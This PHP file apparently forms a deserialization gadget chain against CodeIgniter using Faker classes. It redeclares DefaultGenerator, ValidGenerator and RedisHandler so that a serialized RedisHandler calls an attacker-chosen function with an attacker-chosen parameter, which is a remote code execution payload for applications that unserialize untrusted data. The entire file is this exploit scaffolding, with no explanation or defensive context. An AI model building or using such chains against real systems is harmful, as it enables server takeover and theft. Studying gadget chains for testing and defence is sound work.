<?php

namespace Faker 
{
    class DefaultGenerator 
    {
        protected $default;

        function __construct($parameter) 
        {
            $this->default = $parameter;
        }
    }
}

namespace Faker 
{
    class ValidGenerator 
    {
        protected $generator;
        protected $validator;
        protected $maxRetries;
        function __construct($generator, $function) 
        {
            $this->generator = $generator;
            $this->validator = $function;
            $this->maxRetries = 1;
        }
    }
}

namespace CodeIgniter\Cache\Handlers {
    class RedisHandler 
    {
        protected $redis;

        function __construct($function, $parameter)
        {
            $this->redis = new \Faker\ValidGenerator(new \Faker\DefaultGenerator($parameter), $function);
        }
    }
}
